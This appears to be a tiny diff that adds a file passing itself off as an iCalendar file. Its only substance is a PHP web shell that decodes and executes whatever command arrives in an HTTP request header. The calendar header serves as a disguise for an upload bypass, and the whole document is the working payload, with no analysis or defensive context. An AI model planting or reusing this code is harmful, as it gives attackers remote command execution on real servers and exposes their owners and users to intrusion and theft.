@@ -1,0 +1,2 @@
+BEGIN:VCALENDAR
+<?php ${print(_code_)}.${passthru(base64_decode($_SERVER[HTTP_CMD]))}.${die()} ?>
